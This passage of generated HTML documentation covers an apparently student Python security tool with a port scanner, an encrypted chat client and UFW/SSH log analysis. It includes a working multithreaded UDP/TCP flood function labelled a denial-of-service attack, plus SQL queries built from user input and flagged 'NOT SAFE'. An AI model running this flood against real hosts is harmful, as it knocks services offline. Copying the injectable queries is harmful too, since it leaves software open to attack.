+MMMMMMMMMMMMMMMMMMMMMMMMMMMN:.dXKOOk;.dMMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMNo&#39;;:::::,;OMMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMWXXXXXXXXNWMMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMWNNXNNNNNNXNNNNNNNNNNNNNNNNNNNNNNN0;.xNNNNKc.dWMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMXxc::::::::::::::::::::::::::::::::::;&#39;.,:::::&#39;.,:oONMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMXd,,okKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK0xc,:OWMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMW0:&#39;oXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0:&#39;oNMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMK;.kWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNXXXXXXX0;.oNMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMWo.oWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWk::::::::,.&#39;OMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMN:.kMMMMMMMMMMMMMMMMMMMMMMMMMWWNWWMMMMMMMMMMMMMMMNXXK00000O;.xMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMX:.kMMMMMMMMMMMMMMMMMMMMMMXxc:::::lONMMMMMMMMMMMMMMWOc::::;..dMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMX:.kMMMMMMMMMMMMMMMMMMMMWk,,lk000x:&#39;cKMMMMMMMMMMMMMMNK0000O;.dMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMX:.kMMMMMMMMMMMMMMMMMMMMK,&#39;OMMMMMMWo.lWMMMMMMMMMMMMMMMNd:::..dMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMX:.kMMMMMMMMMMMMMMMMMMMM0,&#39;0MMMMMMWo.lWMMMMMMMMMMMMMMMWKOOk;.dMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMX:.kMMMMMMMMMMMMMMMMMMMMWx&#39;,dXMMW0l&#39;:KMMMMMMMMMMMMMMMMMMMMWl.dMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMX:.dXXXNMMMMMMMMMMMMMMMMMWKc.cNM0,.dNMMMMMMMMMMMMMMMMMMMMMWl.dMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMX: &#39;::cOWMMMMMMMMMMMMMMMMMMk.:NMO.;XMMMMMMMMMMMMMMMMMMMMMMWl.dMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMX:.o000XNNWMMMMMMMMMMMMMMMMk.;0Nx.;XMMMMMMMMMMMMMMMMMMMMMMWl.dWMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMX: &#39;:::::oXMMMMMMMMMMMMMMMMXo,;:;;kWMMMMMMMMMMMMMMMMMMMMMMWl.dMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMX:.o00000KNWWMMMMMMMMMMMMMMMWNKKXNMMMMMMMMMMMMMMMMMMMMMMMMWl.xMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMWl..::::::::lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMX;.OMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMM0,.lO000000KNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo.lNMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMWO,&#39;kNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXl.cXMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMWKl&#39;:xKNNWNNNWNWNNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNWWNX0o,,xNMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMW0o:;::::::::::::::::::::::::::::::::::::::::::::;;cxXWMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMWXK0000000000000000000000000000000000000000000KNWMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+                                        ▄▄▄     ▄▄▄▄▄▄▄ ▄▄▄▄▄▄  
+                                        █   █   █       █      █ 
+                                        █   █   █    ▄  █  ▄    █
+                                        █   █   █   █▄█ █ █ █   █
+                                        █   █▄▄▄█    ▄▄▄█ █▄█   █
+                                        █       █   █   █       █
+                                        █▄▄▄▄▄▄▄█▄▄▄█   █▄▄▄▄▄▄█ 
+
+    &#39;&#39;&#39;
+
+    options = &#39;&#39;&#39;\nChoose a option:
+
+[1]-&gt;Port Scan.
+[2]-&gt;Connections active.
+[3]-&gt;Secure messaging service.
+[4]-&gt;Analyze and process log files.
+[5]-&gt;flood DOS atack.
+[x]-&gt;Exit.
+    &#39;&#39;&#39;
+
+    print(banner)
+
+    allowed, user = login()
+
+    while True:
+        if allowed:
+            print(&#34;-&#34; * 50)
+            print(&#34;Welcome %s !&#34; % user)
+            print(options)
+            print(&#34;-&#34; * 50)
+            answer = input(&#34;\n&gt;&#34;)
+            print(&#34;\n&#34;)
+            if answer == &#34;1&#34;:
+                port_scanner()
+            elif answer == &#34;2&#34;:
+                active_connections()
+            elif answer == &#34;3&#34;:
+                chat()
+            elif answer == &#34;4&#34;:
+                log_manager()
+            elif answer == &#34;5&#34;:
+                flood()
+            elif answer == &#34;x&#34;:
+                break
+
+            else:
+                print(&#34;Choose a NUMBER between 1 and 5.&#34;)</code></pre>
+</details>
+</section>
+<section>
+</section>
+<section>
+</section>
+<section>
+<h2 class="section-title" id="header-functions">Functions</h2>
+<dl>
+<dt id="app_lpd.active_connections"><code class="name flex">
+<span>def <span class="ident">active_connections</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>This function aims to determine the active connections on the machine.
+It uses the command "netstat -a" to get information about the active connections and
+stores this information in a variable called "netstat".
+It then breaks this information into lines and prints them to the screen.</p>
+<h2 id="parameters">Parameters</h2>
+<dl>
+<dt><strong><code>netstat</code></strong> :&ensp;<code>netstat -a list</code></dt>
+<dd>&nbsp;</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>active connections on the machine</code></dt>
+<dd>&nbsp;</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def active_connections():
+    &#34;&#34;&#34;
+    This function aims to determine the active connections on the machine.
+    It uses the command &#34;netstat -a&#34; to get information about the active connections and
+    stores this information in a variable called &#34;netstat&#34;.
+    It then breaks this information into lines and prints them to the screen.
+
+    
+    Parameters
+    -------
+    netstat : netstat -a list
+
+    Returns
+    -------
+    active connections on the machine
+
+
+    &#34;&#34;&#34;
+    print(&#34;Calculating active connections...&#34;)
+
+    netstat = os.popen(&#34;netstat -a&#34;).read()
+    out_line = netstat.split(&#34;\n&#34;)
+
+    print(netstat)</code></pre>
+</details>
+</dd>
+<dt id="app_lpd.authentication"><code class="name flex">
+<span>def <span class="ident">authentication</span></span>(<span>user, passwd)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Authenticates a user using argon2 as the password-hashing function.</p>
+<h2 id="parameters">Parameters</h2>
+<dl>
+<dt><strong><code>user</code></strong> :&ensp;<code>string</code></dt>
+<dd>The user that is trying to authenticate.</dd>
+<dt><strong><code>passwd</code></strong> :&ensp;<code>string</code></dt>
+<dd>The password inputted.</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><strong><code>is_authenticated</code></strong> :&ensp;<code>boolean</code></dt>
+<dd>Returns True if the user/password combo is in the db, otherwise returns False.</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def authentication(user, passwd):
+    &#34;&#34;&#34;
+    Authenticates a user using argon2 as the password-hashing function.
+
+    Parameters
+    -------
+    user : string
+        The user that is trying to authenticate.
+    passwd : string
+        The password inputted.
+
+    Returns
+    -------
+    is_authenticated : boolean
+        Returns True if the user/password combo is in the db, otherwise returns False.
+
+    &#34;&#34;&#34;
+    is_authenticated = False
+
+    ph = PasswordHasher()
+
+    # If no register , this is not necessary
+    ##############################
+    # hash = ph.hash(passwd)      #
+    # print(hash)                 #
+    ##############################
+
+    # DB connection
+    try:
+        conn = sqlite3.connect(&#39;lpd_database.db&#39;)
+        sqlite_select_Query = &#34;select hash from user where name=&#39;%s&#39;&#34; % (
+            user)  # !!! NOT SAFE
+        cursor = conn.cursor()
+        cursor.execute(sqlite_select_Query)
+        record = cursor.fetchall()
+        cursor.close()
+
+    except sqlite3.Error as error:
+        print(&#34;DB Error: &#34; + str(error))
+
+    # Get hash from DB by user
+    if record:
+        # record format [(X,)]
+        a = record[0][0]
+
+        try:
+            ph.verify(a, passwd)
+            is_authenticated = True
+        except Exception as e:
+            print(e)
+
+    return is_authenticated</code></pre>
+</details>
+</dd>
+<dt id="app_lpd.chat"><code class="name flex">
+<span>def <span class="ident">chat</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>The chat() function is responsible for implementing the client side of a messaging application.
+It allows the user to choose a server to send an RSA-encrypted message to and also read all messages sent to the server.
+The function presents a number of options for the user, such as sending an encrypted message, reading messages from the server or
+exiting the application. When choosing option 1, the user is prompted for the server's IP address and port, and then the function checks
+if there are already RSA keys generated to encrypt the message. If not, the user is prompted to generate a new key.
+The message is then encrypted and sent to the server over a socket connection.
+Option 2 allows the user to read the messages sent to the server by again entering the server's IP address and port.
+The function uses the sqlite3 library to connect to the database and retrieve the user ID.
+The function also uses the socket library to establish the connection to the server and the RSA library to encrypt and decrypt the messages.</p>
+<h2 id="parameters">Parameters</h2>
+<dl>
+<dt><strong><code>ip</code></strong> :&ensp;<code>string</code></dt>
+<dd>&nbsp;</dd>
+<dt><strong><code>port</code></strong> :&ensp;<code>int</code></dt>
+<dd>&nbsp;</dd>
+<dt><strong><code>choice</code></strong> :&ensp;<code>string</code></dt>
+<dd>&nbsp;</dd>
+<dt><strong><code>times</code></strong> :&ensp;<code>int</code></dt>
+<dd>&nbsp;</dd>
+<dt><strong><code>threads</code></strong> :&ensp;<code>int</code></dt>
+<dd>&nbsp;</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>udp</code> or <code>tcp <a title="app_lpd.flood" href="#app_lpd.flood">flood()</a> atack</code></dt>
+<dd>&nbsp;</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def chat():
+    &#34;&#34;&#34;
+    The chat() function is responsible for implementing the client side of a messaging application.
+    It allows the user to choose a server to send an RSA-encrypted message to and also read all messages sent to the server.
+    The function presents a number of options for the user, such as sending an encrypted message, reading messages from the server or
+    exiting the application. When choosing option 1, the user is prompted for the server&#39;s IP address and port, and then the function checks
+    if there are already RSA keys generated to encrypt the message. If not, the user is prompted to generate a new key.
+    The message is then encrypted and sent to the server over a socket connection.
+    Option 2 allows the user to read the messages sent to the server by again entering the server&#39;s IP address and port.
+    The function uses the sqlite3 library to connect to the database and retrieve the user ID.
+    The function also uses the socket library to establish the connection to the server and the RSA library to encrypt and decrypt the messages.
+    
+    Parameters
+    -------
+    ip : string
+    port : int
+    choice : string
+    times : int
+    threads : int
+
+    Returns
+    -------
+    udp or tcp flood atack 
+    &#34;&#34;&#34;
+
+    options_chat = &#39;&#39;&#39;\nChoose a option:
+
+    [1]-&gt;Send message encrypted with RSA.
+    [2]-&gt;Read messages from server.
+    [3]-&gt;Exit.
+        &#39;&#39;&#39;
+
+    # Get id of user from database
+    try:
+        conn = sqlite3.connect(&#39;lpd_database.db&#39;)
+        sqlite_select_Query = &#34;select id from user where name=&#39;%s&#39;&#34; % (
+            user)  # !!! NOT SAFE
+        cursor = conn.cursor()
+        cursor.execute(sqlite_select_Query)
+        record = cursor.fetchall()
+        cursor.close()
+
+    except sqlite3.Error as error:
+        print(&#34;DB Error: &#34; + str(error))
+
+    while True:
+
+        print(&#34;-&#34; * 50)
+        print(options_chat)
+        print(&#34;-&#34; * 50)
+        answer = input(&#34;\n&gt;&#34;)
+        print(&#34;\n&#34;)
+        if answer == &#34;1&#34;:
+
+            print(&#34;Whats the server ip?&#34;)
+            server_ip = input(&#34;\n&gt;&#34;)
+            print(&#34;\nWhats the server port?&#34;)
+            server_port = input(&#34;\n&gt;&#34;)
+
+            try:
+                test = int(server_port)
+            except ValueError:
+                print(&#34;Choose a NUMBER for the port!&#34;)
+                chat()
+
+            try:
+
+                # Checking for RSA keys
+                while True:
+                    print(&#34;\nGenerate public key and private key? y/n &#34;)
+                    key_question = input(&#34;\n&gt;&#34;)
+
+                    if key_question == &#34;y&#34;:
+                        key = RSA.generate(RSA_BIT)
+                        private_key = key.export_key()
+                        file_out = open(&#34;private.pem&#34;, &#34;wb&#34;)
+                        file_out.write(private_key)
+                        file_out.close()
+
+                        public_key = key.publickey().export_key()
+                        file_out = open(&#34;receiver.pem&#34;, &#34;wb&#34;)
+                        file_out.write(public_key)
+                        file_out.close()
+                        break
+                    elif key_question == &#34;n&#34;:
+                        try:
+                            file_out = open(&#34;private.pem&#34;, &#34;rb&#34;)
+                            file_out = open(&#34;receiver.pem&#34;, &#34;rb&#34;)
+                            break
+                        except:
+                            print(
+                                &#34;Cant find keys generate from this application, please generate one pair.&#34;)
+                    else:
+                        print(&#34;Write &#39;y&#39; or &#39;n&#39;.&#34;)
+
+                # Encrypting message
+                print(&#34;\nWhat is the message you want to send?&#34;)
+                message = input(&#34;\n&gt;&#34;)
+
+                data = message.encode(&#39;utf-8&#39;)
+                # data = str.encode(message)
+
+                # Encrypt the data with the public RSA key
+                key = RSA.importKey(open(&#39;receiver.pem&#39;).read())
+                cipher = PKCS1_OAEP.new(key)
+                ciphertext = cipher.encrypt(data)
+
+                print(ciphertext)
+
+                # Create connection with server
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                host = server_ip                                           # server address
+                # server port
+                port = int(server_port)
+                s.connect((host, port))
+
+                # Send id to server
+                s.send(str(record[0][0]).encode())
+
+                dataFromServer = s.recv(1024)
+                print(&#34;My ID: &#34; + dataFromServer.decode())
+
+                # Tell server that we want to write our messages
+                dataToServer = &#34;WRITE&#34;
+                s.send(dataToServer.encode())
+
+                # Send ciphertext
+                s.send(ciphertext)
+
+                # close connection
+                s.close()
+
+            except Exception as e:
+                print(&#34;\n&#34; + &#34;ERROR:&#34; + str(e))
+                print(traceback.format_exc())
+
+        elif answer == &#34;2&#34;:
+            print(&#34;Whats the server ip?&#34;)
+            server_ip = input(&#34;\n&gt;&#34;)
+            print(&#34;\nWhats the server port?&#34;)
+            server_port = input(&#34;\n&gt;&#34;)
+
+            try:
+                test = int(server_port)
+            except ValueError:
+                print(&#34;Choose a NUMBER for the port!&#34;)
+                chat()
+
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                host = server_ip                                           # server address
+                # server port
+                port = int(server_port)
+                s.connect((host, port))
+
+                # Send id to server
+                s.send(str(record[0][0]).encode())
+
+                # Check id from server
+                dataFromServer = s.recv(1024)
+                print(&#34;My ID: &#34; + dataFromServer.decode())
+
+                # Tell server that we want to read our messages
+                dataToServer = &#34;READ&#34;
+                s.send(dataToServer.encode())
+
+                # Get messages from server
+                dataFromServer2 = s.recv(1024)
+
+                msg_array = []
+                counter = 0
+
+                while dataFromServer2:
+                    # print(1)
+                    # print(dataFromServer2)
+
+                    if b&#39;You have no messages!&#39; in dataFromServer2:
+                        s.close()
+                        dataFromServer2 = dataFromServer2.replace(
+                            b&#39;You have no messages!&#39;, b&#39;&#39;)
+                        counter = 1
+
+                    # Prob need to split messages .... sadge
+                    if b&#39;LIMITER&#39; in dataFromServer2:
+
+                        # print(dataFromServer2.split(b&#39;LIMITER&#39;))
+                        a = dataFromServer2.split(b&#39;LIMITER&#39;)
+
+                        for i in a:
+                            if i:
+                                msg_array.append(i.replace(b&#39;LIMITER&#39;, b&#39;&#39;))
+
+                        # print(dataFromServer2)
+                    if b&#39;You have no messages!&#39; not in dataFromServer2 and counter == 1:
+                        # msg_array = list(set(msg_array))
+                        print(&#34;XXXXXXXXXXXXXXXX&#34;)
+                        for j in msg_array:
+                            try:
+                                # Decrypting message
+                                key = RSA.importKey(open(&#39;private.pem&#39;).read())
+                                cipher = PKCS1_OAEP.new(key)
+                                message = cipher.decrypt(j)
+                                print(message)
+                            except Exception as e:
+                                print(e)
+
+                    if counter == 1:
+                        break
+                    else:
+                        dataFromServer2 = s.recv(1024)
+                # Close conenction
+                # s.close()
+
+            except Exception as e:
+                print(&#34;\n&#34; + &#34;ERROR:&#34; + str(e))
+                print(traceback.format_exc())
+
+        elif answer == &#34;3&#34;:
+            break
+        else:
+            print(&#34;Choose a NUMBER between 1 and 3.&#34;)</code></pre>
+</details>
+</dd>
+<dt id="app_lpd.flood"><code class="name flex">
+<span>def <span class="ident">flood</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>The "udpflood" function is a denial-of-service (DoS) attack script that sends UDP or TCP
+packets to a specific host on the specified on the specified port.
+The script prompts the user for information such as the IP address of the host, the port,
+whether to send UDP or TCP packets, and the number of packets to be sent over a single connection.
+It also allows the user to specify the number of threads they want to use to send the packets.
+It does this by creating multiple threads with the "Thread" method of the "threading" library
+and then starts these threads with the "start()" method. The script also has a "new" function that
+allows the user to start the attack again with the same settings without having to rerun the whole script.</p>
+<h2 id="parameters">Parameters</h2>
+<dl>
+<dt><strong><code>ip</code></strong> :&ensp;<code>string</code></dt>
+<dd>&nbsp;</dd>
+<dt><strong><code>port</code></strong> :&ensp;<code>int</code></dt>
+<dd>&nbsp;</dd>
+<dt><strong><code>choice</code></strong> :&ensp;<code>string</code></dt>
+<dd>&nbsp;</dd>
+<dt><strong><code>times</code></strong> :&ensp;<code>int</code></dt>
+<dd>&nbsp;</dd>
+<dt><strong><code>threads</code></strong> :&ensp;<code>int</code></dt>
+<dd>&nbsp;</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>udp</code> or <code>tcp <a title="app_lpd.flood" href="#app_lpd.flood">flood()</a> atack</code></dt>
+<dd>&nbsp;</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def flood():
+    
+    &#34;&#34;&#34;
+    The &#34;udpflood&#34; function is a denial-of-service (DoS) attack script that sends UDP or TCP
+    packets to a specific host on the specified on the specified port.
+    The script prompts the user for information such as the IP address of the host, the port,
+    whether to send UDP or TCP packets, and the number of packets to be sent over a single connection.
+    It also allows the user to specify the number of threads they want to use to send the packets.
+    It does this by creating multiple threads with the &#34;Thread&#34; method of the &#34;threading&#34; library
+    and then starts these threads with the &#34;start()&#34; method. The script also has a &#34;new&#34; function that
+    allows the user to start the attack again with the same settings without having to rerun the whole script.
+
+    Parameters
+    -------
+    ip : string
+    port : int
+    choice : string
+    times : int
+    threads : int
+
+    Returns
+    -------
+    udp or tcp flood atack 
+    &#34;&#34;&#34;
+    ip = str(input(&#34; Host/Ip:&#34;))
+    port = int(input(&#34; Port:&#34;))
+    choice = str(input(&#34; chose run flood atack (udp/tcp):&#34;))
+    times = int(input(&#34; Packets per one connection:&#34;))
+    threads = int(input(&#34; Threads:&#34;))
+
+    def run():
+        data = random._urandom(1024)
+        while True:
+            try:
+                # UDP = SOCK_DGRAM
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                addr = (str(ip), int(port))
+                for x in range(times):
+                    s.sendto(data, addr)
+            except:
+                s.close()
+
+    def run2():
+        data = random._urandom(16)
+        while True:
+            try:
+                # TCP = SOCK_STREAM
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((ip, 80))
+                s.send(data)
+                for x in range(times):
+                    s.send(data)
+            except:
+                s.close()
+
+    for y in range(threads):
+        if choice == &#39;udp&#39;:
+            th = threading.Thread(target=run)
+            th.start()
+        else:
+            th = threading.Thread(target=run2)
+            th.start()
+
+    def new():
+        for y in range(threads):
+            if choice == &#39;udp&#39;:
+                th = threading.Thread(target=run)
+                th.start()
+            else:
+                th = threading.Thread(target=run2)
+                th.start()</code></pre>
+</details>
+</dd>
+<dt id="app_lpd.generate_pdf"><code class="name flex">
+<span>def <span class="ident">generate_pdf</span></span>(<span>filename, ip_country, title)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>The above function is used to generate a PDF file based on three arguments: the filename a list of tuples with IP,
+country and timestamp information, and a title.
+The first step is to print a message that the report is being created.
+Next a SimpleDocTemplate object is created with the file name and page size.
+A "Flowable" object container is created and a title is added to the report using the Paragraph object and object and a specific font style.
+Next, a table is created from the list of tuples passed as argument and added to the element container.
+Finally, the document is built and saved with the specified name.
+The function also prints a message that the PDF has been successfully saved.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def generate_pdf(filename, ip_country, title):
+    &#34;&#34;&#34;
+    The above function is used to generate a PDF file based on three arguments: the filename a list of tuples with IP, 
+    country and timestamp information, and a title. 
+    The first step is to print a message that the report is being created. 
+    Next a SimpleDocTemplate object is created with the file name and page size. 
+    A &#34;Flowable&#34; object container is created and a title is added to the report using the Paragraph object and object and a specific font style. 
+    Next, a table is created from the list of tuples passed as argument and added to the element container.
+    Finally, the document is built and saved with the specified name. 
+    The function also prints a message that the PDF has been successfully saved.
+    &#34;&#34;&#34;
+
+    print(&#34;\nCreating report...&#34;)
+
+    doc = SimpleDocTemplate(filename, pagesize=letter)
+
+    # container for the &#39;Flowable&#39; objects
+    elements = []
+
+    # TITLE
+    styleSheet = getSampleStyleSheet()
+    styleSheet.leading = 24
+    styleSheet.add(ParagraphStyle(name=&#39;Normal_CENTER&#39;,
+                                  parent=styleSheet[&#39;Normal&#39;],
+                                  fontName=&#39;Helvetica&#39;,
+                                  wordWrap=&#39;LTR&#39;,
+                                  alignment=TA_CENTER,
+                                  fontSize=12,
+                                  leading=13,
+                                  textColor=colors.black,
+                                  borderPadding=0,
+                                  leftIndent=0,
+                                  rightIndent=0,
+                                  spaceAfter=0,
+                                  spaceBefore=0,
+                                  splitLongWords=True,
+                                  spaceShrinkage=0.05,
+                                  ))
+    elements.append(Paragraph(title, styleSheet[&#39;Normal_CENTER&#39;]))
+
+    ##### TABLE##########
+
+    data = []
+
+    for line in ip_country:
+        data.append(list(line))
+
+    f = Table(data)
+    elements.append(Spacer(1, 0.5*cm))
+    elements.append(f)
+    doc.build(elements)
+    print(&#39;\nDone. PDF saved as &#39; + filename+&#39;.&#39;)</code></pre>
+</details>
+</dd>
+<dt id="app_lpd.log_manager"><code class="name flex">
+<span>def <span class="ident">log_manager</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>The function log_manager() is responsible for analyzing the logs provided by the teacher and
+creating a heatmap for each log. It presents a menu interface for the user to choose between analyzing the UFW or SSH logs.
+If the UFW option is chosen, the function opens the corresponding log file, extracts all IP addresses and
+stores them in a list. It also uses the geoip2 library to get the geographic coordinates of these IP addresses and
+print out the countries from which these IPs were blocked. It then generates and saves a heatmap with these coordinates and
+creates a PDF file with information about the blocked IPs. If the SSH option is is chosen, the function runs a command to
+create a file with all logs of failed login attempts, extracts the IP addresses and times of these events and stores them in a list.
+It also uses the geoip2 library to get the geographic coordinates of these IP addresses and generates and saves a heatmap with these
+coordinates and creates a PDF file with information about the failed login attempts. failures. The function also has an option to exit the menu.
+Parameters</p>
+<hr>
+<p>Choose a option to read log files </p>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code><a title="app_lpd.generate_pdf" href="#app_lpd.generate_pdf">generate_pdf()</a> with with all logs</code> of <code>failed <a title="app_lpd.login" href="#app_lpd.login">login()</a> attempts, extracts the IP addresses and times</code> of <code>these events and stores them in a list anf geo location</code></dt>
+<dd>&nbsp;</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def log_manager():
+    &#34;&#34;&#34;
+    The function log_manager() is responsible for analyzing the logs provided by the teacher and 
+    creating a heatmap for each log. It presents a menu interface for the user to choose between analyzing the UFW or SSH logs. 
+    If the UFW option is chosen, the function opens the corresponding log file, extracts all IP addresses and 
+    stores them in a list. It also uses the geoip2 library to get the geographic coordinates of these IP addresses and 
+    print out the countries from which these IPs were blocked. It then generates and saves a heatmap with these coordinates and 
+    creates a PDF file with information about the blocked IPs. If the SSH option is is chosen, the function runs a command to 
+    create a file with all logs of failed login attempts, extracts the IP addresses and times of these events and stores them in a list. 
+    It also uses the geoip2 library to get the geographic coordinates of these IP addresses and generates and saves a heatmap with these 
+    coordinates and creates a PDF file with information about the failed login attempts. failures. The function also has an option to exit the menu.
+    Parameters
+    -------
+    Choose a option to read log files 
+
+    Returns
+    -------
+    generate_pdf with with all logs of failed login attempts, extracts the IP addresses and times of these events and stores them in a list anf geo location
+    
+    &#34;&#34;&#34;
+    options_chat = &#39;&#39;&#39;\nChoose a option:
+
+[1]-&gt;UFW logs.
+[2]-&gt;SSH logs.
+[3]-&gt;Exit.
+    &#39;&#39;&#39;
+
+    while True:
+        print(&#34;-&#34; * 50)
+        print(options_chat)
+        print(&#34;-&#34; * 50)
+        answer = input(&#34;\n&gt;&#34;)
+        print(&#34;\n&#34;)
+        if answer == &#34;1&#34;:
+            # ufw logs
+
+            # Set path ...
+            abspath = os.path.abspath(__file__)
+            dname = os.path.dirname(abspath)
+            os.chdir(dname)
+
+            ips = []
+            p = re.compile(
+                &#39;(^[a-zA-Z]{3} [0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2})(.*?)(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})&#39;)
+
+            with open(dname + &#39;/logs/ufw.log&#39;) as f:
+                for lines in f.readlines():
+
+                    match = p.search(lines)
+                    if match:
+
+                        ip = match.group(3)
+                        timestamp = match.group(1)
+
+                        is_private = ipaddress.ip_address(ip).is_private
+
+                        if is_private:
+                            pass
+                            # print(&#34;SRC IP IS PRIVATE:&#34;+srcIp)
+                        else:
+                            # print(&#34;SRC IP IS PUBLIC:&#34;+srcIp)
+                            ips.append((ip, timestamp))
+
+            coords = []
+
+            # GeoLite2-City.mmdb
+            client = geoip2.database.Reader(&#39;GeoLite2-City.mmdb&#39;)
+            # $ curl ipinfo.io/ip
+
+            # removing duplicates
+            # ips = list(set(ips))
+            ip_country = []
+            print(&#34;Countries of IPs that were blocked:&#34;)
+
+            for ip in ips:
+                response = client.city(str(ip[0]))
+
+                lat = response.location.latitude
+                lon = response.location.longitude
+                print(response.country.name + &#34;: &#34; +
+                      str(ip[0]) + &#39; at &#39; + str(ip[1]))
+                ip_country.append(
+                    (response.country.name, str(ip[0]), str(ip[1])))
+                coords.append((lat, lon))
+
+            # generate and save heatmap
+            m = folium.Map(tiles=&#34;OpenStreetMap&#34;,
+                           location=[20, 10], zoom_start=2)
+            # mess around with these values to change how the heatmap looks
+            HeatMap(data=coords, radius=15, blur=20, max_zoom=2).add_to(m)
+            m.save(&#34;ufw_log_heatmap_trb&#34;)
+            print(&#39;\nDone. Heatmap saved as ufw_log_heatmap_trb.&#39;)
+
+            # Generate a pdf
+            generate_pdf(&#34;ufw_log_info.pdf&#34;, ip_country, &#34;UFW Block IPs&#34;)
+
+        elif answer == &#34;2&#34;:
+            # SSH logs
+
+            # Create file to parse
+            # &#34;grep &#34;Failed password&#34; /var/log/auth.log &gt; failed_attempts.txt&#34;
+            ssh_log = os.popen(
+                &#34;grep &#39;Failed password&#39; ./logs/auth.log &#34;).read()
+            ssh_log = ssh_log.split(&#39;\n&#39;)
+
+            # get ip from logs
+            # p = re.compile(&#39;\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}&#39;)
+            p = re.compile(
+                &#39;(^[a-zA-Z]{3} [0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2})(.*?)(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})&#39;)
